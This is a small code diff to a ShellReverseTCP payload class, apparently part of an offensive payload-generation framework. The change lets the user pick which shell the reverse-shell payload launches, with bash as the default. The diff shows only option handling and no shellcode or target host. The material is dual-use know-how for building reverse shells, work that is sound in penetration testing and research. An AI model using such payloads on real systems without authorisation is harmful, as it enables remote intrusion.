@@ -33,6 +33,11 @@ class ShellReverseTCP(HatAsm, HatVenom):
         if 'RHOST' not in options and 'RPORT' not in options:
             return b''
 
+        if 'SHELL' in options:
+            shell = options['SHELL']
+        else:
+            shell = self.shells['bash']
+
         rhost = self.convert_host(options['RHOST'])
         rport = self.convert_port(options['RPORT'])
 
